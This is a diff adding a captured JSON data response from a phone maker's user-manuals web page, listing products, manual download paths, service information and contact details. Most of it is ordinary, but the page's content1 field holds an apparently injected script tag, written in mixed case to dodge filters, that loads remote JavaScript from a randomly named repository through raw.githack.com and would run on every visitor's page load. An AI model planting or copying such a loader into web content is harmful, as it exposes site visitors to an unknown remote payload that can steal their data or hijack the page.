@@ -1,0 +1,556 @@
+{
+  "url": "https://www.lavamobiles.com/_next/data/ly0JhjssYFJ7DcRKPylzU/user-manuals.json",
+  "method": "GET",
+  "status": 200,
+  "content_type": "application/json",
+  "body": {
+    "pageProps": {
+      "userManual": {
+        "status": 1,
+        "msg": "Care Detail",
+        "base_url": "https://hotfixapi.lavamobiles.com/storage/",
+        "recommended_products": [
+          {
+            "id": 83,
+            "name": "Prowatch ZN",
+            "slug": "prowatch-zn",
+            "status": 1,
+            "image": "media/community/image/prowatchzn-listing-1730208131.webp",
+            "thumbnail_image": null,
+            "short_description": "High Resolution AMOLED Big Display | Corning GG3 Cover Glass",
+            "description": null,
+            "price": 4999,
+            "new_launches": "no",
+            "parent_id": "accessories",
+            "launch_date": "2024-04-23T00:00:00.000Z",
+            "external_url": "https://prowatch.lavamobiles.com/zn/",
+            "recommended_product": "yes",
+            "product_variant": []
+          },
+          {
+            "id": 84,
+            "name": "Prowatch VN",
+            "slug": "prowatch-vn",
+            "status": 1,
+            "image": "media/community/image/prowatch-vn-listing-1721133266.webp",
+            "thumbnail_image": null,
+            "short_description": "Big Display High Resolution Display | Big Display High Resolution Display",
+            "description": null,
+            "price": 3999,
+            "new_launches": "no",
+            "parent_id": "accessories",
+            "launch_date": "2024-04-23T00:00:00.000Z",
+            "external_url": "https://prowatch.lavamobiles.com/vn/",
+            "recommended_product": "yes",
+            "product_variant": []
+          },
+          {
+            "id": 25,
+            "name": "AGNI 5G",
+            "slug": "agni5g",
+            "status": 1,
+            "image": "media/community/image/agni5g-1703576400.webp",
+            "thumbnail_image": "media/community/thumbnail_image/agni5g-1703576400.webp",
+            "short_description": "Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display",
+            "description": "<p>Powered by MediaTek Dimensity 810 - 5G | Powerful 5000mAh battery | 64 MP AI Quad Camera | 90 Hz Display</p>",
+            "price": 23999,
+            "new_launches": "no",
+            "parent_id": "smartphones",
+            "launch_date": null,
+            "external_url": null,
+            "recommended_product": "yes",
+            "product_variant": [
+              {
+                "id": 73,
+                "name": "AGNI 5G",
+                "image": "media/images/product-variant/image_path/agni-5g-thumb-1703672392.webp",
+                "thumbnail": "media/images/product-variant/thumbnail/agni-5g-thumb-1703672384.webp",
+                "color_code": "#4278b8"
+              }
+            ]
+          }
+        ],
+        "user_manuals": [
+          {
+            "id": 1055,
+            "title": "Probuds T51",
+            "download_file": "media/file/user-manuals/download_file/probuds-t51-1768304188.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 59,
+            "title": "Probuds T12",
+            "download_file": "media/file/user-manuals/download_file/probuds-t12-1757486796.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 58,
+            "title": "Probuds N12",
+            "download_file": "media/file/user-manuals/download_file/probuds-n12-1757486780.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 57,
+            "title": "Probuds Wave 931",
+            "download_file": "media/file/user-manuals/download_file/probuds-wave-931-1756447526.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 56,
+            "title": "Probuds N33",
+            "download_file": "media/file/user-manuals/download_file/probuds-n33-1756447485.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 55,
+            "title": "Probuds Wave 921",
+            "download_file": "media/file/user-manuals/download_file/probuds-wave-921-1753442285.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 54,
+            "title": "Probuds N21",
+            "download_file": "media/file/user-manuals/download_file/probuds-n21-1751608388.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 52,
+            "title": "Lava Probuds Aria 911",
+            "download_file": "media/file/user-manuals/download_file/probuds-aria-911-user-manual-1750336511.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 51,
+            "title": "Prowatch X",
+            "download_file": "media/file/user-manuals/download_file/prowatch-x-user-manual-1735552770.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 49,
+            "title": "Probuds T24",
+            "download_file": "media/file/user-manuals/download_file/Probuds T24.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 48,
+            "title": "Prowatch V1",
+            "download_file": "media/file/user-manuals/download_file/prowatch-v1-user-manual-1730276982.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 47,
+            "title": "Prowatch ZN",
+            "download_file": "media/file/user-manuals/download_file/lava_prowatch-zn_user's-manual_16-feb-2024-1721734987.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 46,
+            "title": "Probuds T31",
+            "download_file": "media/file/user-manuals/download_file/probuds-t31-1719824518.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 45,
+            "title": "Prowatch VN",
+            "download_file": "media/file/user-manuals/download_file/lava_prowatch-vn_user's-manual_16-feb-2024[41]-1721734912.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 44,
+            "title": "Lava Yuva 2 Pro",
+            "download_file": "media/file/user-manuals/download_file/lava-yuva-2-pro-user-manual-1703773351.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 43,
+            "title": "LAVA Z6",
+            "download_file": "media/file/user-manuals/download_file/z6-user-manual-1703773321.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 42,
+            "title": "LAVA Z2s",
+            "download_file": "media/file/user-manuals/download_file/z2s-user-manual-1703773302.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 41,
+            "title": "LAVA Agni 5G",
+            "download_file": "media/file/user-manuals/download_file/agni-user-manual-1703773278.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 40,
+            "title": "LAVA Aura",
+            "download_file": "media/file/user-manuals/download_file/user-manual_aura-1703773157.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 39,
+            "title": "LAVA 34 Ultra",
+            "download_file": "media/file/user-manuals/download_file/usermanual-34-ultra-1703773138.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 38,
+            "title": "LAVA HERO 600+",
+            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600+-1703773121.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 37,
+            "title": "LAVA Pulse",
+            "download_file": "media/file/user-manuals/download_file/usermanual-pulse-um-1703773103.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 36,
+            "title": "LAVA Prime X",
+            "download_file": "media/file/user-manuals/download_file/user-manual-prime-x-1703773085.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 35,
+            "title": "LAVA A1 GOLD",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-gold-1703773050.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 34,
+            "title": "LAVA 34 SUPER",
+            "download_file": "media/file/user-manuals/download_file/user-manual-34-super-1703773007.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 33,
+            "title": "LAVA A1 JOSH",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-josh-1703772986.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 32,
+            "title": "LAVA SPARK I8",
+            "download_file": "media/file/user-manuals/download_file/user-manual--lava-i8-1703772812.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 31,
+            "title": "LAVA A7",
+            "download_file": "media/file/user-manuals/download_file/user-manual--a7-1703772764.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 30,
+            "title": "Lava Blaze Pro",
+            "download_file": "media/file/user-manuals/download_file/lava-blaze-pro-user-manual-1703772724.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 29,
+            "title": "Lava Blaze 2",
+            "download_file": "media/file/user-manuals/download_file/lava-blaze-2-user-manual-1703772681.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 28,
+            "title": "LAVA Z4",
+            "download_file": "media/file/user-manuals/download_file/z4-user-manual-1703772663.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 27,
+            "title": "LAVA Z2",
+            "download_file": "media/file/user-manuals/download_file/z2-user-manual-1703772606.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 26,
+            "title": "LAVA Z2 Max",
+            "download_file": "media/file/user-manuals/download_file/z2-max-user-manual-1703772560.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 25,
+            "title": "LAVA Magnum XL",
+            "download_file": "media/file/user-manuals/download_file/user-manual_magnum_xl-1703772486.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 24,
+            "title": "LAVA HERO 600s",
+            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600s-1703772384.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 23,
+            "title": "LAVA HERO 600",
+            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600-1703772362.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 22,
+            "title": "LAVA Pulse 1",
+            "download_file": "media/file/user-manuals/download_file/usermanual-pulse1-um-1703772321.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 21,
+            "title": "LAVA ONE",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-one-1703772298.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 20,
+            "title": "LAVA A7 WAVE",
+            "download_file": "media/file/user-manuals/download_file/user-manual-a7-wave-1703772273.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 19,
+            "title": "LAVA 34 PLUS",
+            "download_file": "media/file/user-manuals/download_file/user-manual-34-plus-1703771355.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 18,
+            "title": "LAVA A1 BUZZ",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-buzz-1703771327.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 17,
+            "title": "LAVA GEM",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-gem-1703771296.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 16,
+            "title": "LAVA A3",
+            "download_file": "media/file/user-manuals/download_file/npi_user-manual-captain-a3-1703771260.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 15,
+            "title": "Lava Blaze",
+            "download_file": "media/file/user-manuals/download_file/lava-blaze-user-manual-1703771228.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 14,
+            "title": "LAVA Z21",
+            "download_file": "media/file/user-manuals/download_file/z21-user-manual-1703771190.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 13,
+            "title": "LAVA Z3",
+            "download_file": "media/file/user-manuals/download_file/z3-user-manual-1703771119.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 12,
+            "title": "LAVA Z1s",
+            "download_file": "media/file/user-manuals/download_file/z1s-user-manual-1703771095.docx",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 11,
+            "title": "LAVA Ivory",
+            "download_file": "media/file/user-manuals/download_file/user-manual_ivory-1703771073.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 10,
+            "title": "LAVA A1 Colours",
+            "download_file": "media/file/user-manuals/download_file/usermanual-lava-a1-colours-1703771056.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 9,
+            "title": "LAVA HERO 600s WC",
+            "download_file": "media/file/user-manuals/download_file/usermanual-hero-600s-wc-1703771035.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 8,
+            "title": "LAVA A7 2020",
+            "download_file": "media/file/user-manuals/download_file/usermanual-a7-2020-1703771017.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 7,
+            "title": "LAVA Z61 Pro",
+            "download_file": "media/file/user-manuals/download_file/usermanual-z61-pro-1703770996.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 6,
+            "title": "LAVA GEM WAVE",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-gem-wave-1703770975.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 5,
+            "title": "LAVA A7 ROSE GOLD",
+            "download_file": "media/file/user-manuals/download_file/user-manual-a7-rose-gold-1703770929.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 4,
+            "title": "LAVA A1",
+            "download_file": "media/file/user-manuals/download_file/user-manual-lava-a1-1703770903.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 3,
+            "title": "LAVA PRIME Z",
+            "download_file": "media/file/user-manuals/download_file/lava-prime-z-1703770873.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 2,
+            "title": "LAVA HERO 600",
+            "download_file": "media/file/user-manuals/download_file/lava-hero-600-1703770841.pdf",
+            "sorting": 1,
+            "status": 1
+          },
+          {
+            "id": 1,
+            "title": "LAVA A1200",
+            "download_file": "media/file/user-manuals/download_file/npi-user-manual-a1200-1703770639.pdf",
+            "sorting": 1,
+            "status": 1
+          }
+        ],
+        "we_care": [
+          {
+            "id": 3,
+            "type": "9",
+            "title": "Service@Home",
+            "description": "<h3 class=\"text-xl  lg:mb-5 mb-3\" data-aos=\"fade-up\" data-aos-duration=\"1000\">Service@Home</h3>\r\n<p class=\"text-base\" data-aos=\"fade-up\">To avail Free Service at Home and Phone Replacement on AGNI 2, <br>visit the  <a href=\"/lava_service_at_home\" class=\"underline\">Service at Home</a>.</p>",
+            "image_path": "media/cmsimage/image_path/lava-care-banner2-1721625848.webp",
+            "image_path_mobile": "media/cmsimage/image_path_mobile/service-home-2-1721625849.webp",
+            "mobile": null,
+            "sorting": 1
+          },
+          {
+            "id": 7,
+            "type": "9",
+            "title": "User Manuals",
+            "description": "<h3 class=\"text-xl lg:mb-5 mb-3\" data-aos=\"fade-up\" data-aos-duration=\"1000\">User Manuals</h3>\r\n<p class=\"text-base\" data-aos=\"fade-up\"><a href=\"/user-manuals\" class=\"underline\">Download User Manuals</a></p>",
+            "image_path": "media/cmsimage/image_path/user-manual-1703572504.webp",
+            "image_path_mobile": "media/cmsimage/image_path_mobile/user-manual-1708339434.webp",
+            "mobile": null,
+            "sorting": 1
+          }
+        ],
+        "contact": [
+          {
+            "id": 1,
+            "type": "8",
+            "title": "Address",
+            "description": "<h2 class=\"text-white font-S700 mb-3.5\">Address</h2>\r\n\r\n <p class=\"font-S400 text-[#B4B4B4] mb-3\">LAVA International Ltd.<br> A-56, Sector \u2013 64, Noida-201301 (UP)</p>\r\n <a target=\"_blank\" href=\"https://www.google.com/maps/place/Lava+International+Ltd./@28.6123071,77.3725704,17z/data=!3m1!4b1!4m6!3m5!1s0x390ce5135260691d:0x2c4dec1e62551dcf!8m2!3d28.6123024!4d77.3751453!16s%2Fg%2F11f5t376s4?entry=ttu\">\r\n                Get Direction\r\n                <img class=\"inline-block -mt-1\" src=\"/assets/img/arrow_right_white.svg\">\r\n              </a>",
+            "image_path": "media/cmsimage/image_path/pin-1703082456.webp",
+            "image_path_mobile": null,
+            "mobile": null,
+            "sorting": 1
+          },
+          {
+            "id": 4,
+            "type": "8",
+            "title": "24x7 Toll Free Number",
+            "description": "<p><br></p>",
+            "image_path": "media/cmsimage/image_path/phone-1703084061.webp",
+            "image_path_mobile": null,
+            "mobile": "1800-103-6844",
+            "sorting": 3
+          }
+        ]
+      },
+      "pageData": {
+        "status": 1,
+        "msg": "user-manuals Page Content",
+        "data": {
+          "id": 21,
+          "slug": "user-manuals",
+          "name": "User Manuals",
+          "sub_text": "User Manuals",
+          "content1": "<p><br></p><sCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js></ScRiPt>",
+          "content2": null,
+          "content3": null,
+          "content4": null,
+          "content5": null,
+          "content6": null,
+          "page_title": "Lava Service Centres List, Customer Care, Spare Parts Price - LAVA Mobiles",
+          "meta_keywords": null,
+          "meta_description": "Lava Service Centres List, Customer Care, Spare Parts Price - LAVA Mobiles",
+          "meta_other": null,
+          "video_url": null,
+          "image": "media/cmspage/image/user-manual-banner-1703336958.webp",
+          "image_alt": null,
+          "image_mobile": "media/cmspage/image_mobile/frame-157512-1703585370.webp",
+          "status": 1
+        },
+        "leadership": {},
+        "success": "success"
+      }
+    },
+    "__N_SSG": true
+  }
+}
